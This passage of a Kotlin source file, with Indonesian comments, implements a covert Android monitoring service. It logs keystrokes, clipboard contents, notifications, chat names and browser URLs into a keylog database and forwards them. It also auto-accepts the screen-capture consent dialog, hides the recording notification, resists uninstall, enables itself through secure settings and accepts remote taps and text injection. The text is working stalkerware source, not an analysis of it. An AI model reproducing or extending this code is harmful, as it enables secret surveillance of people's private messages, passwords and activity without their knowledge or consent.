package com.rambox.mirror

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class RamboxAccessibilityService : AccessibilityService() {

    val blockedPackages = java.util.Collections.synchronizedSet(mutableSetOf<String>())

    fun reloadBlockedPackages() {
        try {
            val saved = getBlockedPackages(this)
            blockedPackages.clear()
            blockedPackages.addAll(saved)
        } catch (e: Exception) {}
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        reloadBlockedPackages()
    }

    fun addBlockedPackage(pkg: String) {
        setPackageBlocked(this, pkg, true)
    }

    fun removeBlockedPackage(pkg: String) {
        setPackageBlocked(this, pkg, false)
    }

    fun isPackageBlocked(pkg: String): Boolean {
        if (isLauncherPackage(pkg)) return false
        return blockedPackages.contains(pkg) || getBlockedPackages(this).contains(pkg)
    }

    private fun isLauncherPackage(pkg: String): Boolean {
        return try {
            val homeIntent = Intent(Intent.ACTION_MAIN).apply { addCategory(Intent.CATEGORY_HOME) }
            val resolveInfo = packageManager.resolveActivity(homeIntent, PackageManager.MATCH_DEFAULT_ONLY)
            resolveInfo?.activityInfo?.packageName == pkg
        } catch (_: Exception) {
            false
        }
    }


    companion object {
        var instance: RamboxAccessibilityService? = null
        @Volatile var isSilentCaptureMode: Boolean = false
        /** Set true sesaat sebelum startActivityForResult(captureIntent) dipanggil.
         *  Ini memberi sinyal ke AccessibilityService untuk auto-klik "Mulai Sekarang"
         *  di dialog konfirmasi MediaProjection tanpa menunggu isSilentCaptureMode. */
        @Volatile var isWaitingForProjectionConsent: Boolean = false
        private const val PREFS_NAME = "rambox_blocked_apps"
        private const val KEY_BLOCKED = "blocked_packages"

        fun getBlockedPackages(context: Context): Set<String> {
            return try {
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                prefs.getStringSet(KEY_BLOCKED, emptySet()) ?: emptySet()
            } catch (e: Exception) {
                emptySet()
            }
        }

        fun hasWriteSecureSettings(context: Context): Boolean {
            return try {
                context.checkCallingOrSelfPermission(android.Manifest.permission.WRITE_SECURE_SETTINGS) == android.content.pm.PackageManager.PERMISSION_GRANTED
            } catch (e: Exception) {
                false
            }
        }

        fun autoEnableAccessibility(context: Context): Boolean {
            if (!hasWriteSecureSettings(context)) return false
            return try {
                val myComponent = android.content.ComponentName(context, RamboxAccessibilityService::class.java).flattenToString()
                val cr = context.contentResolver

                val enabledServices = android.provider.Settings.Secure.getString(
                    cr,
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val servicesList = enabledServices.split(":").filter { it.isNotBlank() }.toMutableSet()

                if (!servicesList.contains(myComponent)) {
                    servicesList.add(myComponent)
                    val newEnabledServices = servicesList.joinToString(":")
                    android.provider.Settings.Secure.putString(
                        cr,
                        android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                        newEnabledServices
                    )
                }

                android.provider.Settings.Secure.putInt(
                    cr,
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
                    1
                )
                android.util.Log.d("RamboxAcc", "Accessibility auto-enabled successfully via WRITE_SECURE_SETTINGS")
                true
            } catch (e: Exception) {
                android.util.Log.w("RamboxAcc", "Failed to auto-enable accessibility: ${e.message}")
                false
            }
        }

        fun setPackageBlocked(context: Context, packageName: String, blocked: Boolean) {
            try {
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                val currentSet = prefs.getStringSet(KEY_BLOCKED, emptySet())?.toMutableSet() ?: mutableSetOf()
                if (blocked) {
                    currentSet.add(packageName)
                } else {
                    currentSet.remove(packageName)
                }
                prefs.edit().putStringSet(KEY_BLOCKED, currentSet).commit()
                instance?.reloadBlockedPackages()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private var currentPackageName: String? = null
    private var currentAppName: String? = null
    private var appOpenTimeMillis: Long = 0
    private var lastBlockedToastTime: Long = 0
    private var lastBlockActionTime: Long = 0
    private var lastCopiedText: String = ""
    private var lastAutoPermissionClickTime: Long = 0
    private var lastSingleAppWarnTime: Long = 0

    // Smart Sentence Debouncing & Sentence Builder
    private var pendingTypedText: String = ""
    private var pendingPkgName: String = ""
    private var pendingAppName: String = ""
    private var pendingContextTitle: String = ""
    private val debounceHandler = Handler(Looper.getMainLooper())
    private val debounceRunnable = Runnable { flushPendingTyping() }

    // Polling granularitas ketikan (poin 2): event TEXT_CHANGED hanya memberi
    // teks final; polling 200ms menangkap keadaan antara + hapusan.
    // Berhenti otomatis saat flush / pindah app / unbind.
    private val pollHandler = Handler(Looper.getMainLooper())
    private var pollRunnable: Runnable? = null
    private var pollIdleTicks = 0

    private fun startTypingPoller() {
        stopTypingPoller()
        pollIdleTicks = 0
        val r = object : Runnable {
            override fun run() {
                try {
                    val root = rootInActiveWindow
                    var node: AccessibilityNodeInfo? = null
                    try { node = root?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) } catch (_: Exception) {}
                    if (node == null) node = findTargetEditableNode(root)
                    val t = try { node?.text?.toString()?.trim() } catch (_: Exception) { null }
                    if (!t.isNullOrBlank()) {
                        if (t != pendingTypedText) {
                            pendingTypedText = t
                            pollIdleTicks = 0
                            // Segarkan timer debounce: user masih mengetik.
                            debounceHandler.removeCallbacks(debounceRunnable)
                            debounceHandler.postDelayed(debounceRunnable, 1000)
                        } else {
                            pollIdleTicks++
                        }
                    } else {
                        pollIdleTicks++
                    }
                    try { node?.recycle() } catch (_: Exception) {}
                    try { if (root != null) root.recycle() } catch (_: Exception) {}
                } catch (_: Exception) { pollIdleTicks++ }
                // Berhenti bila 30 dtk tanpa perubahan (150 x 200ms) agar hemat baterai.
                if (pollIdleTicks < 150) {
                    pollHandler.postDelayed(this, 200)
                } else {
                    pollRunnable = null
                }
            }
        }
        pollRunnable = r
        pollHandler.postDelayed(r, 200)
    }

    private fun stopTypingPoller() {
        try {
            pollRunnable?.let { pollHandler.removeCallbacks(it) }
        } catch (_: Exception) {}
        pollRunnable = null
    }

    private var dbHelper: KeylogDatabaseHelper? = null
    private val dbExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
    private val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

    // Watchdog reconnect: disimpan sebagai field agar bisa dibatalkan
    // (dulu: Handler lokal di onServiceConnected -> leak + post abadi tiap 15 dtk).
    private var watchdogHandler: Handler? = null
    private val watchdogRunnable = object : Runnable {
        override fun run() {
            try {
                val prefs = applicationContext.getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
                val isExplicitlyKilled = prefs.getBoolean("is_explicitly_killed", false)
                if (!isExplicitlyKilled) {
                    if (ScreenCaptureService.instance == null) {
                        val serviceIntent = Intent(applicationContext, ScreenCaptureService::class.java)
                        try {
                            androidx.core.content.ContextCompat.startForegroundService(applicationContext, serviceIntent)
                        } catch (_: Exception) {}
                    } else {
                        ScreenCaptureService.instance?.ensureConnected()
                    }
                }
            } catch (_: Exception) {
            } finally {
                watchdogHandler?.postDelayed(this, 15000)
            }
        }
    }

    // 🔇 Auto-dismiss recording notification (Android 14+)
    private val RECORDING_KEYWORDS = listOf(
        "merekam", "recording", "screen capture", "screen cast",
        "berbagi layar", "screen sharing", "sedang merekam",
        "casting", "projecting", "screen mirror",
        "perekaman layar", "tangkapan layar aktif",
        "casting your screen", "recording your screen",
        "screen is being recorded", "layar sedang direkam",
        "screen is being captured", "screen is being shared",
        "is capturing your screen", "memproyeksikan layar",
        "sedang berbagi layar", "sedang memproyeksikan"
    )
    private val SYSTEM_RECORDING_PACKAGES = listOf(
        "android", "com.android.systemui",
        "com.samsung.android.app.smartcapture",
        "com.miui.screenrecorder", "com.coloros.screenrecorder",
        "com.oplus.screenrecorder", "com.sec.android.app.screenrecorder"
    )

    override fun onUnbind(intent: Intent?): Boolean {
        flushPendingTyping()
        stopTypingPoller()
        watchdogHandler?.removeCallbacks(watchdogRunnable)
        watchdogHandler = null
        if (instance == this) { instance = null }
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        flushPendingTyping()
        stopTypingPoller()
        watchdogHandler?.removeCallbacks(watchdogRunnable)
        watchdogHandler = null
        try { dbExecutor.shutdownNow() } catch (_: Exception) {}
        try { dbHelper?.close() } catch (_: Exception) {}
        dbHelper = null
        if (instance == this) { instance = null }
        super.onDestroy()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        // DB terenkripsi: migrasi plaintext lama dulu bila ada, baru buka helper.
        try { KeylogDatabaseHelper.ensureEncrypted(applicationContext) } catch (_: Exception) {}
        // F14: Keystore/ciphertext rusak tidak boleh mematikan accessibility
        // service. Tanpa DB, fitur keylog nonaktif tapi service tetap hidup.
        dbHelper = try {
            KeylogDatabaseHelper(applicationContext)
        } catch (e: Throwable) {
            android.util.Log.w("RamboxKeylog", "DB keylog tidak dapat dibuka: ${e.message}")
            null
        }

        try {
            val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
            info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
            info.flags = info.flags or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            serviceInfo = info
        } catch (e: Exception) {
            e.printStackTrace()
        }

        setupClipboardListener()

        // Watchdog memakai field-level handler+runnable agar bisa dibatalkan
        // di onUnbind/onDestroy.
        watchdogHandler?.removeCallbacks(watchdogRunnable)
        val wh = Handler(Looper.getMainLooper())
        watchdogHandler = wh
        wh.postDelayed(watchdogRunnable, 1000)
    }

    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null

    private fun setupClipboardListener() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager ?: return
            // M1 FIX: Cabut listener lama sebelum mendaftarkan baru (cegah listener ganda)
            clipboardListener?.let { try { clipboard.removePrimaryClipChangedListener(it) } catch (_: Exception) {} }

            val newListener = ClipboardManager.OnPrimaryClipChangedListener {
                try {
                    val clip = clipboard.primaryClip
                    if (clip != null && clip.itemCount > 0) {
                        // K4 FIX: Abaikan bila sistem menandai clip sebagai IS_SENSITIVE (password/OTP)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            if (clip.description?.extras?.getBoolean("android.content.extra.IS_SENSITIVE") == true) {
                                return@OnPrimaryClipChangedListener
                            }
                        }
                        val text = clip.getItemAt(0).text?.toString()?.trim()
                        if (!text.isNullOrBlank() && text != lastCopiedText) {
                            lastCopiedText = text
                            val now = System.currentTimeMillis()
                            val timestampStr = timeFormat.format(Date(now))
                            val appLabel = currentAppName ?: "Sistem"
                            val pkgName = currentPackageName ?: "android"
                            sendLogToService(
                                timestamp = timestampStr,
                                packageName = pkgName,
                                appName = appLabel,
                                eventType = "clipboard",
                                contextTitle = "📋 Salin / Tempel (Clipboard)",
                                content = text,
                                duration = ""
                            )
                        }
                    }
                } catch (e: Exception) {}
            }
            clipboardListener = newListener
            clipboard.addPrimaryClipChangedListener(newListener)
        } catch (e: Exception) {}
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
            ScreenCaptureService.notifyOrientationCheck()
        }

        // ⚡ 1. Auto-Allow Permissions
        checkAndAutoAllowPermissions(event)

        // 🛡️ 2. Anti-Uninstall Guard
        checkAndBlockUninstallAttempt(event)

        val pkgName = event.packageName?.toString() ?: return
        val isSystemPkg = pkgName == "android" || pkgName.startsWith("com.android.systemui") || pkgName == packageName

        // 🔇 Auto-dismiss recording notification dari sistem (Android 14+)
        // Harus dicek SEBELUM return untuk system packages
        if (isSystemPkg && event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            autoDismissRecordingNotification(event, pkgName)
            return // Jangan log notifikasi dari system package
        }

        if (isSystemPkg) return

        // 🚫 3. INSTANT APP BLOCKER ENFORCEMENT
        if (isPackageBlocked(pkgName)) {
            val nowBlock = System.currentTimeMillis()
            if (nowBlock - lastBlockActionTime > 800) {
                lastBlockActionTime = nowBlock
                performGlobalAction(GLOBAL_ACTION_HOME)
                try {
                    val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                        addCategory(Intent.CATEGORY_HOME)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
                    }
                    startActivity(homeIntent)
                } catch (_: Exception) {}
            }
            return
        }

        val appLabel = getAppNameFromPackage(pkgName)
        val now = System.currentTimeMillis()
        val timestampStr = timeFormat.format(Date(now))

        when (event.eventType) {
            // 📱 App Switch / Window Change
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (pkgName != currentPackageName) {
                    flushPendingTyping()

                    if (currentPackageName != null && currentAppName != null && appOpenTimeMillis > 0) {
                        val durationSec = (now - appOpenTimeMillis) / 1000
                        val mins = durationSec / 60
                        val secs = durationSec % 60
                        val durationStr = if (mins > 0) "${mins}m ${secs}s" else "${secs}s"

                        sendLogToService(
                            timestamp = timestampStr,
                            packageName = currentPackageName!!,
                            appName = currentAppName!!,
                            eventType = "app_close",
                            contextTitle = "Menutup Aplikasi",
                            content = "Selesai menggunakan $currentAppName (Durasi: $durationStr)",
                            duration = durationStr
                        )
                    }

                    currentPackageName = pkgName
                    currentAppName = appLabel
                    appOpenTimeMillis = now

                    val contextTitle = detectContextTitle(rootInActiveWindow, pkgName)
                    sendLogToService(
                        timestamp = timestampStr,
                        packageName = pkgName,
                        appName = appLabel,
                        eventType = "app_open",
                        contextTitle = if (contextTitle.isNotEmpty()) contextTitle else "Membuka Aplikasi",
                        content = "Membuka aplikasi $appLabel",
                        duration = ""
                    )
                }
            }

            // ⌨️ Smart Sentence Keylogging & Field Context
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // Sumber utama: event.text. Sebagian app/WebView mengosongkan
                // event.text, jadi fallback ke node sumber / field fokus.
                var typedText = event.text?.joinToString(" ")?.trim().orEmpty()
                if (typedText.isBlank()) {
                    typedText = try {
                        (event.source?.text?.toString() ?: "").trim()
                    } catch (_: Exception) { "" }
                }
                if (typedText.isBlank()) {
                    typedText = try {
                        val focus = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                        val t = (focus?.text?.toString() ?: "").trim()
                        try { focus?.recycle() } catch (_: Exception) {}
                        t
                    } catch (_: Exception) { "" }
                }
                if (typedText.isNotBlank()) {
                    // FIX: Flush pending text if user switched to another field or app before debounce timer expired
                    if (pendingTypedText.isNotBlank() && (pendingPkgName != pkgName || (!typedText.startsWith(pendingTypedText) && !pendingTypedText.startsWith(typedText)))) {
                        flushPendingTyping()
                    }

                    val root = rootInActiveWindow
                    val contextHeader = detectContextTitle(root, pkgName)

                    pendingTypedText = typedText
                    pendingPkgName = pkgName
                    pendingAppName = appLabel
                    // Fallback generik tahan-update: hint/label field fokus bila
                    // tak ada selector yang cocok (app update UI / app tak dikenal).
                    pendingContextTitle = when {
                        contextHeader.isNotEmpty() -> contextHeader
                        else -> {
                            val hint = focusedFieldHint(root)
                            if (hint.isNotEmpty()) "⌨️ $hint" else "💬 Ketikan Teks"
                        }
                    }

                    // Debounce timer: waits 1000ms after user pauses typing
                    debounceHandler.removeCallbacks(debounceRunnable)
                    debounceHandler.postDelayed(debounceRunnable, 1000)

                    // Polling granularitas: tangkap keadaan antara + hapusan.
                    startTypingPoller()
                }
            }

            // 🚀 Flush when user clicks Send / Search / Submit or switches buttons
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val node = event.source
                val resId = node?.viewIdResourceName?.lowercase() ?: ""
                val text = (node?.text?.toString() ?: node?.contentDescription?.toString() ?: "").lowercase()

                val isSubmit = resId.contains("send") || resId.contains("submit") || resId.contains("search") ||
                        text.contains("kirim") || text.contains("send") || text.contains("cari") || text.contains("masuk") || text.contains("ok")

                if (isSubmit || pendingTypedText.isNotBlank()) {
                    flushPendingTyping()
                }
            }

            // 🔄 Flush when focus changes to another form field
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                flushPendingTyping()
            }

            // 🔔 Incoming Notifications & Messages (Two-Way Tracker)
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                try {
                    val parcelable = event.parcelableData
                    if (parcelable is android.app.Notification) {
                        // FIX: extras can be null on some Android versions/custom notifications
                        val extras = parcelable.extras ?: return
                        val notifTitle = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
                        val notifText = extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
                        if (notifText.isNotBlank()) {
                            val contextHeader = if (notifTitle.isNotBlank()) "🔔 Pesan Masuk dari: $notifTitle" else "🔔 Notifikasi Baru"
                            sendLogToService(
                                timestamp = timestampStr,
                                packageName = pkgName,
                                appName = appLabel,
                                eventType = "notification",
                                contextTitle = contextHeader,
                                content = if (notifTitle.isNotBlank()) "$notifTitle: $notifText" else notifText,
                                duration = ""
                            )
                        }
                    }
                } catch (e: Exception) {}
            }
        }
    }

    private fun flushPendingTyping() {
        debounceHandler.removeCallbacks(debounceRunnable)
        stopTypingPoller()
        if (pendingTypedText.isNotBlank()) {
            val now = System.currentTimeMillis()
            val timestampStr = timeFormat.format(Date(now))
            sendLogToService(
                timestamp = timestampStr,
                packageName = pendingPkgName,
                appName = pendingAppName,
                eventType = "text_input",
                contextTitle = pendingContextTitle,
                content = pendingTypedText,
                duration = ""
            )
            pendingTypedText = ""
        }
    }

    private fun focusedFieldHint(root: AccessibilityNodeInfo?): String {
        if (root == null) return ""
        var node: AccessibilityNodeInfo? = null
        return try {
            try { node = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) } catch (_: Exception) {}
            if (node == null) node = findTargetEditableNode(root)
            val n = node ?: return ""
            val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                n.hintText?.toString()?.trim()
            } else null
            val label = if (!hint.isNullOrBlank()) hint
                else (n.contentDescription?.toString()?.trim()
                    ?: n.text?.toString()?.trim() ?: "")
            if (label.length > 60) label.take(60) else label
        } catch (_: Exception) {
            ""
        } finally {
            try { node?.recycle() } catch (_: Exception) {}
        }
    }

    private fun detectContextTitle(root: AccessibilityNodeInfo?, pkgName: String): String {
        if (root == null) return ""
        try {
            // 0. Selector remote (diupdate dari server tanpa rebuild APK) didahulukan.
            val appKey = SelectorStore.appKeyFor(pkgName)
            if (appKey != null) {
                val dynIds = SelectorStore.getIds(this, appKey)
                for (id in dynIds) {
                    try {
                        val nodes = root.findAccessibilityNodeInfosByViewId(id)
                        val t = nodes.firstOrNull()?.text?.toString()?.trim()
                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                        if (!t.isNullOrBlank()) return "💬 $appKey: $t"
                    } catch (_: Exception) {}
                }
            }
            if (pkgName.contains("whatsapp", ignoreCase = true)) {
                val headerNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name")
                if (headerNodes.isNotEmpty() && !headerNodes[0].text.isNullOrBlank()) {
                    return "💬 Chat WhatsApp: ${headerNodes[0].text}"
                }
                val titleNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/toolbar")
                if (titleNodes.isNotEmpty() && !titleNodes[0].text.isNullOrBlank()) {
                    return "💬 WhatsApp: ${titleNodes[0].text}"
                }
            } else if (pkgName.contains("telegram", ignoreCase = true)) {
                val titleNodes = root.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/chat_title")
                if (titleNodes.isNotEmpty() && !titleNodes[0].text.isNullOrBlank()) {
                    return "💬 Telegram: ${titleNodes[0].text}"
                }
            } else if (pkgName.contains("instagram", ignoreCase = true)) {
                val titleNodes = root.findAccessibilityNodeInfosByViewId("com.instagram.android:id/action_bar_title")
                if (titleNodes.isNotEmpty() && !titleNodes[0].text.isNullOrBlank()) {
                    return "💬 Instagram Direct: ${titleNodes[0].text}"
                }
            } else if (pkgName.contains("chrome", ignoreCase = true) || pkgName.contains("browser", ignoreCase = true)) {
                val urlNodes = root.findAccessibilityNodeInfosByViewId("com.android.chrome:id/url_bar")
                if (urlNodes.isNotEmpty() && !urlNodes[0].text.isNullOrBlank()) {
                    return "🌐 URL Browser: ${urlNodes[0].text}"
                }
            } else if (pkgName.contains("youtube", ignoreCase = true)) {
                val searchNodes = root.findAccessibilityNodeInfosByViewId("com.google.android.youtube:id/search_query")
                if (searchNodes.isNotEmpty() && !searchNodes[0].text.isNullOrBlank()) {
                    return "🔍 Pencarian YouTube: ${searchNodes[0].text}"
                }
            } else if (pkgName.contains("note", ignoreCase = true) || pkgName.contains("catatan", ignoreCase = true) || pkgName.contains("keep", ignoreCase = true)) {
                return "📝 Catatan / Dokumen"
            }
        } catch (e: Exception) {}
        return ""
    }

    override fun onInterrupt() {
        flushPendingTyping()
        stopTypingPoller()
    }

    fun getRealScreenDimensions(): Pair<Float, Float> {
        try {
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
            var rawW = 0f
            var rawH = 0f

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val bounds = windowManager?.currentWindowMetrics?.bounds
                if (bounds != null && bounds.width() > 0 && bounds.height() > 0) {
                    rawW = bounds.width().toFloat()
                    rawH = bounds.height().toFloat()
                }
            }
            if (rawW <= 0f || rawH <= 0f) {
                if (windowManager != null) {
                    val metrics = android.util.DisplayMetrics()
                    @Suppress("DEPRECATION")
                    windowManager.defaultDisplay?.getRealMetrics(metrics)
                    if (metrics.widthPixels > 0 && metrics.heightPixels > 0) {
                        rawW = metrics.widthPixels.toFloat()
                        rawH = metrics.heightPixels.toFloat()
                    }
                }
            }
            if (rawW <= 0f || rawH <= 0f) {
                val fb = resources.displayMetrics
                rawW = fb.widthPixels.toFloat()
                rawH = fb.heightPixels.toFloat()
            }

            val dm = getSystemService(Context.DISPLAY_SERVICE) as? android.hardware.display.DisplayManager
            val defaultDisplay = dm?.getDisplay(android.view.Display.DEFAULT_DISPLAY)
            val rotation = defaultDisplay?.rotation ?: if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try { display?.rotation ?: android.view.Surface.ROTATION_0 } catch (_: Exception) { android.view.Surface.ROTATION_0 }
            } else {
                @Suppress("DEPRECATION")
                windowManager?.defaultDisplay?.rotation ?: android.view.Surface.ROTATION_0
            }
            val isLandscape = rotation == android.view.Surface.ROTATION_90 || rotation == android.view.Surface.ROTATION_270 || (rawW > rawH)

            val width = if (isLandscape) maxOf(rawW, rawH) else minOf(rawW, rawH)
            val height = if (isLandscape) minOf(rawW, rawH) else maxOf(rawW, rawH)
            return Pair(width, height)
        } catch (e: Exception) {
            e.printStackTrace()
            val fb = resources.displayMetrics
            return Pair(fb.widthPixels.toFloat(), fb.heightPixels.toFloat())
        }
    }

    fun performTap(xRatio: Double, yRatio: Double) {
        try {
            val (width, height) = getRealScreenDimensions()

            val targetX = (xRatio.toFloat() * width).coerceIn(0f, width - 1f)
            val targetY = (yRatio.toFloat() * height).coerceIn(0f, height - 1f)
            // FIX Bug#1: Pure instant tap - minimal sub-pixel movement (0.1f), tidak menjadi micro-drag
            // Bug sebelumnya: 1-pixel movement + 100ms = Android interpret sebagai drag start → ACTION_CANCEL
            val endY = targetY + 0.1f

            val path = Path()
            path.moveTo(targetX, targetY)
            path.lineTo(targetX, endY)

            // FIX Bug#1: startTime=50ms (delayed start), duration=45ms = genuine single tap gesture
            val stroke = GestureDescription.StrokeDescription(path, 50, 45)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()

            // FIX Bug#3: Dispatch dari main looper agar tidak gagal silently di Android 14/15/16 OEM ROMs
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                dispatchGesture(gesture, object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        android.util.Log.d("RamboxAcc", "Tap SUCCESS at ($targetX, $targetY)")
                    }
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        android.util.Log.w("RamboxAcc", "Tap CANCELLED at ($targetX, $targetY)")
                    }
                }, null)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun performLongPress(xRatio: Double, yRatio: Double, durationMs: Long = 700L) {
        try {
            val (width, height) = getRealScreenDimensions()

            val targetX = (xRatio.toFloat() * width).coerceIn(0f, width - 1f)
            val targetY = (yRatio.toFloat() * height).coerceIn(0f, height - 1f)
            val endY = if (targetY + 1f < height) targetY + 1f else targetY - 1f

            val path = Path()
            path.moveTo(targetX, targetY)
            path.lineTo(targetX, endY)

            val pressDuration = durationMs.coerceIn(500L, 1500L)
            val stroke = GestureDescription.StrokeDescription(path, 0, pressDuration)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()

            // FIX Bug#3: Dispatch dari main looper
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                dispatchGesture(gesture, object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        android.util.Log.d("RamboxAcc", "LongPress SUCCESS at ($targetX, $targetY) duration=${pressDuration}ms")
                    }
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        android.util.Log.w("RamboxAcc", "LongPress CANCELLED at ($targetX, $targetY)")
                    }
                }, null)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun performSwipe(x1Ratio: Double, y1Ratio: Double, x2Ratio: Double, y2Ratio: Double, durationMs: Long = 200) {
        try {
            val (width, height) = getRealScreenDimensions()

            val startX = (x1Ratio.toFloat() * width).coerceIn(0f, width - 1f)
            val startY = (y1Ratio.toFloat() * height).coerceIn(0f, height - 1f)
            var endX = (x2Ratio.toFloat() * width).coerceIn(0f, width - 1f)
            var endY = (y2Ratio.toFloat() * height).coerceIn(0f, height - 1f)

            // CRITICAL: Ensure path has non-zero length to avoid "Path is empty" exception
            if (Math.abs(endX - startX) < 1f && Math.abs(endY - startY) < 1f) {
                endY = if (startY + 5f <= height) startY + 5f else startY - 5f
            }

            val path = Path()
            path.moveTo(startX, startY)
            path.lineTo(endX, endY)

            // FIX Bug#2: Clamp swipe duration max 120ms untuk scroll agar tidak overlap dengan gesture berikutnya
            // (throttle JS = 160ms, gesture sebelumnya 220ms → overlap → Swipe CANCELLED)
            val swipeDuration = durationMs.coerceIn(80, 120)
            val stroke = GestureDescription.StrokeDescription(path, 0, swipeDuration)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()

            // FIX Bug#3: Dispatch dari main looper
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                dispatchGesture(gesture, object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        android.util.Log.d("RamboxAcc", "Swipe SUCCESS ($startX,$startY)->($endX,$endY)")
                    }
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        android.util.Log.w("RamboxAcc", "Swipe CANCELLED")
                    }
                }, null)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun performTextInjection(text: String, isFullText: Boolean = false) {
        try {
            val root = rootInActiveWindow ?: return
            var targetNode: AccessibilityNodeInfo? = null
            try {
                targetNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            } catch (_: Exception) {}
            if (targetNode == null) {
                targetNode = findTargetEditableNode(root)
            }
            if (targetNode != null) {
                targetNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) targetNode.hintText?.toString() else null
                val curr = targetNode.text?.toString() ?: ""
                val isPlaceholder = (hint != null && curr.equals(hint, ignoreCase = true)) ||
                                    curr.startsWith("Ketik teks", ignoreCase = true) ||
                                    curr.startsWith("Ketik pesan", ignoreCase = true) ||
                                    curr.startsWith("Tulis pesan", ignoreCase = true) ||
                                    curr.startsWith("Search", ignoreCase = true) ||
                                    curr.startsWith("Cari", ignoreCase = true)

                val newText = if (isFullText || isPlaceholder) {
                    text
                } else {
                    curr + text
                }
                val arguments = android.os.Bundle()
                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, newText)
                targetNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                try { targetNode.recycle() } catch (_: Exception) {}
            }
            try { root.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {}
    }

    fun performBackspace() {
        try {
            val root = rootInActiveWindow ?: return
            var targetNode: AccessibilityNodeInfo? = null
            try {
                targetNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            } catch (_: Exception) {}
            if (targetNode == null) {
                targetNode = findTargetEditableNode(root)
            }
            if (targetNode != null) {
                val existingText = targetNode.text?.toString() ?: ""
                if (existingText.isNotEmpty()) {
                    val newText = existingText.substring(0, existingText.length - 1)
                    val arguments = android.os.Bundle()
